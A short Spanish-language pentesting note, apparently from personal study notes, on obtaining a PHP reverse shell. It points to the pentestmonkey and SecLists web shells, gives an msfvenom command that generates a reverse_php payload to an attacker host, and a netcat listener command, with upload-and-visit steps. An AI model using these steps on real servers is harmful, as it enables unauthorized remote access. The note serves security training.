## Reverse shell

#### Preconfigurados

Un reverse shell fiable es [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)

Ademas tambien hay en [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) para varios lenguajes


Usaremos en el ejemplo el [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell):

- Lo abrimos e introducimos nuestro IP y PUERTO

![[Pasted image 20260721095220.png]]

- Abrimos un listener por ese puerto en nuestro host atacante

![[Pasted image 20260721095241.png]]

- Subimos el archivo y lo visitamos para que se ejecute y nos devuelva la reverse shell en el listener


## Personalizados


Usaremos msfvenom:

- Creamos el reverse shell:

```
msfvenom -p php/reverse_php LHOST=IP_Kali LPORT=PUERTO -f raw > reverse.php
```
![[Pasted image 20260721095448.png]]

- Creamos el listener en nuestro host atacante

```
nc -nvlp PUERTO
```
![[Pasted image 20260721095543.png]]

- Lo subimos, lo visitamos y obtenemos el reverse shell
